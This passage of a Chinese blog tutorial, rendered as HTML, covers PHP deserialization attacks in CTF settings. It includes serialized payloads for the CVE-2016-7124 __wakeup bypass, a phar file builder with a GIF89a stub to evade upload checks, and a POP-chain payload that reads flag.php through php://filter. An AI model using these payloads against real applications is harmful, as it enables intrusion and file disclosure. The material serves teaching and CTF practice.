class=\"hljs-string\">\"\\0Name\\0password\"</span>;i:<span class=\"hljs-number\">100</span>;}<br><span class=\"hljs-comment\">// 若为private，则需要在类名和字段名前面都加上\\0  (python)  若为URL提交则需要\\0替换为%00</span><br><span class=\"hljs-comment\">//数组,则需要用中括号，其中第一个为i表明数字，标号使用0</span><br>s:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"nickname\"</span>;a:<span class=\"hljs-number\">1</span>:{i:<span class=\"hljs-number\">0</span>;s:<span class=\"hljs-number\">204</span>:<span class=\"hljs-string\">\"whe\"</span>;} <span class=\"hljs-comment\">//后面不跟分号</span><br><br><span class=\"hljs-comment\">//其中s代表当前属性的值为str类型格式为s:长度:\"字符串内容\"，当为int型时，则使用i:数字   </span><br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433022.png\" alt=\"image-20200803145952668\"></p>\n<p><a href=\"https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/\">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>\n<h2 id=\"私有和保护属性\"><a href=\"#私有和保护属性\" class=\"headerlink\" title=\"私有和保护属性\"></a>私有和保护属性</h2><figure class=\"highlight llvm\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\"><span class=\"hljs-keyword\">private</span>属性在进行序列化时会在成员名前加上<span class=\"hljs-variable\">%00</span>类名<span class=\"hljs-variable\">%00</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433033.png\" alt=\"image-20200803152828191\"></p>\n<p>Example是当前类的类名，其中filename是当前的成员名</p>\n<figure class=\"highlight llvm\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs llvm\"><span class=\"hljs-keyword\">protected</span>要在成员名前加上<span class=\"hljs-variable\">%00</span>*<span class=\"hljs-variable\">%00</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433029.png\" alt=\"image-20200803152817741\"></p>\n<p><strong>序列化他只序列化属性，不序列化方法</strong></p>\n<p><strong>类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击</strong></p>\n<h3 id=\"魔法函数\"><a href=\"#魔法函数\" class=\"headerlink\" title=\"魔法函数\"></a>魔法函数</h3><figure class=\"highlight scss\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scss\"><span class=\"hljs-comment\">//魔法函数</span><br><span class=\"hljs-built_in\">__construct</span>()，类的构造函数，当对象创建时会自动调用(但在unserialize()时是不会自动调用的)。<br><br><span class=\"hljs-built_in\">__destruct</span>()，类的析构函数，反序列化时调用\t<br><br><span class=\"hljs-built_in\">__call</span>()，在对象中调用一个不可访问方法时调用<br><br><span class=\"hljs-built_in\">__callStatic</span>()，用静态方式中调用一个不可访问方法时调用<br><br><span class=\"hljs-built_in\">__get</span>()，获得一个类的成员变量时调用，当访问一个不存在的属性时也会触发该操作<br><br><span class=\"hljs-built_in\">__set</span>()，设置一个类的成员变量时调用<br><br><span class=\"hljs-built_in\">__isset</span>()，当对不可访问属性调用<span class=\"hljs-built_in\">isset</span>()或<span class=\"hljs-built_in\">empty</span>()时调用<br><br><span class=\"hljs-built_in\">__unset</span>()，当对不可访问属性调用<span class=\"hljs-built_in\">unset</span>()时被调用。<br><br><span class=\"hljs-built_in\">__sleep</span>()，执行<span class=\"hljs-built_in\">serialize</span>()时，先会调用这个函数<br><br><span class=\"hljs-built_in\">__wakeup</span>()，执行<span class=\"hljs-built_in\">unserialize</span>()时，先会调用这个函数<br><br><span class=\"hljs-built_in\">__toString</span>()，类被当成字符串时的回应方法，例如执行字符串匹配的时候回触发<br><br><span class=\"hljs-built_in\">__invoke</span>()，调用函数的方式调用一个对象时的回应方法<br><br><span class=\"hljs-built_in\">__set_state</span>()，调用<span class=\"hljs-built_in\">var_export</span>()导出类时，此静态方法会被调用。<br><br><span class=\"hljs-built_in\">__clone</span>()，当对象复制完成时调用<br><br><span class=\"hljs-built_in\">__autoload</span>()，尝试加载未定义的类<br><br><span class=\"hljs-built_in\">__debugInfo</span>()，打印所需调试信息<br></code></pre></td></tr></tbody></table></figure>\n\n<p><a href=\"https://blog.csdn.net/qq_45521281/article/details/105891381\">https://blog.csdn.net/qq_45521281/article/details/105891381</a></p>\n<h2 id=\"正则绕过\"><a href=\"#正则绕过\" class=\"headerlink\" title=\"正则绕过\"></a>正则绕过</h2><hr>\n<figure class=\"highlight mathematica\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mathematica\">可以使用<span class=\"hljs-built_in\">O</span><span class=\"hljs-operator\">:+</span><span class=\"hljs-number\">4</span>来替换<span class=\"hljs-built_in\">O</span><span class=\"hljs-operator\">:</span><span class=\"hljs-number\">4</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n\n\n<h2 id=\"CVE-2016-7124-Wakeup函数绕过\"><a href=\"#CVE-2016-7124-Wakeup函数绕过\" class=\"headerlink\" title=\"CVE-2016-7124 Wakeup函数绕过\"></a>CVE-2016-7124 Wakeup函数绕过</h2><hr>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// __wakeup()函数，在反序列化时，被自动调用,但当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行</span><br><span class=\"hljs-comment\">//PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 </span><br><span class=\"hljs-comment\">//也就是上面的例子中的3改为4，则就会绕过wakeup函数</span><br>O:<span class=\"hljs-number\">9</span>:<span class=\"hljs-string\">\"DemoClass\"</span>:<span class=\"hljs-number\">4</span>:{s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"name\"</span>;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"john\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"sex\"</span>;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"Women\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"age\"</span>;s:<span class=\"hljs-number\">2</span>:<span class=\"hljs-string\">\"18\"</span>;}<br><span class=\"hljs-comment\">//其中3</span><br>O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Objt\"</span>:<span class=\"hljs-number\">3</span>:{s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"%00Name%00username\"</span>;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"admin\"</span>;s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"%00Name%00password\"</span>;i:<span class=\"hljs-number\">100</span>;}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>例子：</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Name</span></span>{<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$username</span> = <span class=\"hljs-string\">'nonono'</span>;<br>    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-variable\">$password</span> = <span class=\"hljs-string\">'yesyes'</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$username</span>,<span class=\"hljs-variable\">$password</span></span>)</span>{<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;username = <span class=\"hljs-variable\">$username</span>;<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;password = <span class=\"hljs-variable\">$password</span>;<br>    }<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__wakeup</span>(<span class=\"hljs-params\"></span>)</span>{<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;username = <span class=\"hljs-string\">'guest'</span>;<br>    }<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span>(<span class=\"hljs-params\"></span>)</span>{<br>        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable language_\">$this</span>-&gt;password != <span class=\"hljs-number\">100</span>) {<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"</span>;<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"You name is: \"</span>;<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable language_\">$this</span>-&gt;username;<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;/br&gt;\"</span>;<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"You password is: \"</span>;<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable language_\">$this</span>-&gt;password;<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;/br&gt;\"</span>;<br>            <span class=\"hljs-keyword\">die</span>();<br>        }<br>        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable language_\">$this</span>-&gt;username === <span class=\"hljs-string\">'admin'</span>) {<br>            <span class=\"hljs-keyword\">global</span> <span class=\"hljs-variable\">$flag</span>;<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;<br>        }<span class=\"hljs-keyword\">else</span>{<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"</span>;<br>            <span class=\"hljs-keyword\">die</span>();      <br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>Payload：</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Objt\"</span>:<span class=\"hljs-number\">3</span>:{s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"%00Name%00username\"</span>;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"admin\"</span>;s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\"%00Name%00password\"</span>;i:<span class=\"hljs-number\">100</span>;}<br><span class=\"hljs-comment\">// 其中构造%00Name%00表明使用对象的private对象，其等价于Name-&gt;username</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"PHP序列化长度变化导致字符逃逸\"><a href=\"#PHP序列化长度变化导致字符逃逸\" class=\"headerlink\" title=\"PHP序列化长度变化导致字符逃逸\"></a>PHP序列化长度变化导致字符逃逸</h3><hr>\n<p>PHP反序列化中值的字符读取多少其实是由表示长度的数字控制的</p>\n<p>只要整个字符串的前一部分能够成功反序列化，这个字符串后面剩下的一部分将会被丢弃</p>\n<p>如果将对象进行序列化，而后进行改变再进行反序列化，则这个过程中一定存在漏洞</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-variable\">$s</span>=<span class=\"hljs-title function_ invoke__\">unserialize</span>(<span class=\"hljs-string\">'O:11:\"FileHandler\":3:{s:2:\"op\";s:1:\"2\";s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";s:8:\"flag.php\";}'</span>);<br><br><span class=\"hljs-title function_ invoke__\">var_dump</span>(<span class=\"hljs-variable\">$s</span>);<br><br><br><span class=\"hljs-comment\"># 输出---------------------</span><br><span class=\"hljs-keyword\">object</span>(<span class=\"hljs-built_in\">__PHP_Incomplete_Class</span>)<span class=\"hljs-comment\">#2 (4) {</span><br>  [<span class=\"hljs-string\">\"__PHP_Incomplete_Class_Name\"</span>]=&gt;<br>  <span class=\"hljs-keyword\">string</span>(<span class=\"hljs-number\">11</span>) <span class=\"hljs-string\">\"FileHandler\"</span><br>  [<span class=\"hljs-string\">\"op\"</span>]=&gt;<br>  <span class=\"hljs-keyword\">string</span>(<span class=\"hljs-number\">1</span>) <span class=\"hljs-string\">\"2\"</span><br>  [<span class=\"hljs-string\">\"filename\"</span>]=&gt;<br>  <span class=\"hljs-keyword\">string</span>(<span class=\"hljs-number\">8</span>) <span class=\"hljs-string\">\"flag.php\"</span><br>  [<span class=\"hljs-string\">\"content\"</span>]=&gt;<br>  <span class=\"hljs-keyword\">string</span>(<span class=\"hljs-number\">8</span>) <span class=\"hljs-string\">\"flag.php\"</span><br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433031.png\" alt=\"image-20200723172157626\"></p>\n<h2 id=\"toString-NaN\"><a href=\"#toString-NaN\" class=\"headerlink\" title=\"__toString()\"></a>__toString()</h2><hr>\n<p>当对对象进行echo和**file_exists()**的时候</p>\n<h2 id=\"phar反序列化利用\"><a href=\"#phar反序列化利用\" class=\"headerlink\" title=\"phar反序列化利用\"></a>phar反序列化利用</h2><hr>\n<p><strong>条件</strong>：php.ini中的phar.readonly = Off</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">//示例代码</span><br><span class=\"hljs-meta\">&lt;?php</span><br>\t<span class=\"hljs-comment\">//反序列化payload构造</span><br>    <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">TestObject</span> </span>{<br>    }<br>    <br>    @<span class=\"hljs-title function_ invoke__\">unlink</span>(<span class=\"hljs-string\">\"phar.phar\"</span>);<br>    <span class=\"hljs-variable\">$phar</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Phar</span>(<span class=\"hljs-string\">\"phar.phar\"</span>); <span class=\"hljs-comment\">//后缀名必须为phar</span><br>    <span class=\"hljs-variable\">$phar</span>-&gt;<span class=\"hljs-title function_ invoke__\">startBuffering</span>();<br>    <span class=\"hljs-comment\">//设置stub，GIF89a可以改成其他的字段，绕过文件头检验，但必须以 __HALT_COMPILER(); ?&gt; 结尾</span><br>    <span class=\"hljs-variable\">$phar</span>-&gt;<span class=\"hljs-title function_ invoke__\">setStub</span>(<span class=\"hljs-string\">\"GIF89a\"</span>.<span class=\"hljs-string\">\"&lt;?php __HALT_COMPILER(); ?&gt;\"</span>); <br><br>\t<span class=\"hljs-comment\">//将反序列化的对象放入该文件中</span><br>    <span class=\"hljs-variable\">$o</span> = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">TestObject</span>();<br>    <span class=\"hljs-variable\">$o</span>-&gt;data=<span class=\"hljs-string\">'just a test'</span>;<br>    <span class=\"hljs-variable\">$phar</span>-&gt;<span class=\"hljs-title function_ invoke__\">setMetadata</span>(<span class=\"hljs-variable\">$o</span>);<br><br>\t<span class=\"hljs-comment\">//phar本质上是个压缩包，所以要添加压缩的文件和文件内容</span><br>    <span class=\"hljs-variable\">$phar</span>-&gt;<span class=\"hljs-title function_ invoke__\">addFromString</span>(<span class=\"hljs-string\">\"test.txt\"</span>, <span class=\"hljs-string\">\"test\"</span>); <br>    <span class=\"hljs-variable\">$phar</span>-&gt;<span class=\"hljs-title function_ invoke__\">stopBuffering</span>();<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>\n\n<ol>\n<li><p><code>phar</code>文件头的识别格式是<code>xxx</code> +<!--?php  __HALT_COMPILER(); ?-->，只有这样的格式才能被识别为<code>phar</code>文件</p>\n</li>\n<li><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433039.png\" alt=\"image-20200803171031539\"></p>\n</li>\n<li><p><code>phar</code>是压缩文件，那么压缩文件的信息就会存在第二段<strong>manifest describing</strong>，这一段是放序列化的<code>poc</code></p>\n</li>\n<li><p><strong>phar文件会以序列化的形式存储用户自定义的meta-data，在一些文件操作函数执行的参数可控时，我们在参数部分利用Phar伪协议，可以不依赖unserialize() 直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的</strong></p>\n</li>\n<li><p>压缩的文件的内容被存在第三段，也就是上面payload的中的<code>text.txt</code>.部分函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化</p>\n</li>\n<li><p>数字签名为该<code>phar</code>的第四段</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433050.png\" alt=\"image-20200803171100075\"></p>\n<p>生成的phar文件</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433318.png\" alt=\"image-20200803161934014\"></p>\n</li>\n</ol>\n<p><strong>使用条件</strong>：</p>\n<p>(1)文件上传点<br>(2)系统文件函数<br>(3) phar:// 伪协议</p>\n<figure class=\"highlight kotlin\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs kotlin\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">TestObject</span>{<br>\t\tfunction __destruct(){<br>\t\t\techo $<span class=\"hljs-keyword\">this</span>-&gt;<span class=\"hljs-keyword\">data</span>;<br>\t\t}<br>\t}<br><br>\tunlink(<span class=\"hljs-string\">\"phar://phar.phar/test.txt\"</span>);<br></code></pre></td></tr></tbody></table></figure>\n\n<p>当执行如上函数时，phar文件中的payload即可被执行</p>\n<h2 id=\"构造POP链\"><a href=\"#构造POP链\" class=\"headerlink\" title=\"构造POP链\"></a>构造POP链</h2><hr>\n<p>例题：</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">Welcome to index.php<br><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Modifier</span> </span>{<br>    <span class=\"hljs-keyword\">protected</span>  <span class=\"hljs-variable\">$var</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">append</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$value</span></span>)</span>{<br>        <span class=\"hljs-keyword\">include</span>(<span class=\"hljs-variable\">$value</span>);<br>    }<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__invoke</span>(<span class=\"hljs-params\"></span>)</span>{<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;<span class=\"hljs-title function_ invoke__\">append</span>(<span class=\"hljs-variable\">$this</span>-&gt;<span class=\"hljs-keyword\">var</span>);<br>    }<br>}<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Show</span></span>{<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$source</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$str</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$file</span>=<span class=\"hljs-string\">'index.php'</span></span>)</span>{<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;source = <span class=\"hljs-variable\">$file</span>;<br>        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'Welcome to '</span>.<span class=\"hljs-variable language_\">$this</span>-&gt;source.<span class=\"hljs-string\">\"&lt;br&gt;\"</span>;<br>    }<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__toString</span>(<span class=\"hljs-params\"></span>)</span>{<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">$this</span>-&gt;str-&gt;source;<br>    }<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__wakeup</span>(<span class=\"hljs-params\"></span>)</span>{<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">\"/gopher|http|file|ftp|https|dict|\\.\\./i\"</span>, <span class=\"hljs-variable\">$this</span>-&gt;source)) {<br>            <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"hacker\"</span>;<br>            <span class=\"hljs-variable language_\">$this</span>-&gt;source = <span class=\"hljs-string\">\"index.php\"</span>;<br>        }<br>    }<br>}<br><br><span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Test</span></span>{<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-variable\">$p</span>;<br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span>(<span class=\"hljs-params\"></span>)</span>{<br>        <span class=\"hljs-variable language_\">$this</span>-&gt;p = <span class=\"hljs-keyword\">array</span>();<br>    }<br><br>    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__get</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$key</span></span>)</span>{<br>        <span class=\"hljs-variable\">$function</span> = <span class=\"hljs-variable language_\">$this</span>-&gt;p;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$function</span>();<br>    }<br>}<br><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'pop'</span>])){<br>    @<span class=\"hljs-title function_ invoke__\">unserialize</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'pop'</span>]);<br>}<br><span class=\"hljs-keyword\">else</span>{<br>    <span class=\"hljs-variable\">$a</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Show</span>;<br>    <span class=\"hljs-title function_ invoke__\">highlight_file</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br>}<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<p>Payload</p>\n<figure class=\"highlight php\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Show\"</span>:<span class=\"hljs-number\">2</span>:{s:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"source\"</span>;O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Show\"</span>:<span class=\"hljs-number\">2</span>:{s:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"source\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"aaa\"</span>;s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"str\"</span>;O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Test\"</span>:<span class=\"hljs-number\">1</span>:{s:<span class=\"hljs-number\">1</span>:<span class=\"hljs-string\">\"p\"</span>;O:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"Modifier\"</span>:<span class=\"hljs-number\">1</span>:{s:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"%00*%00var\"</span>;s:<span class=\"hljs-number\">52</span>:<span class=\"hljs-string\">\"php://filter/convert.base64-encode/resource=flag.php\"</span>;}}}s:<span class=\"hljs-number\">3</span>:<span class=\"hljs-string\">\"str\"</span>;N;}<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n\n\n<h2 id=\"MySQL触发反序列化\"><a href=\"#MySQL触发反序列化\" class=\"headerlink\" title=\"MySQL触发反序列化\"></a>MySQL触发反序列化</h2><hr>\n<p>php调用mysql的语句  <strong>LOAD DATA LOCAL INFILE</strong> 导入phar文件也能触发phar中的反序列化</p>\n<p>需要my.ini进行如下配置</p>\n<figure class=\"highlight ini\"><table><tbody><tr><td 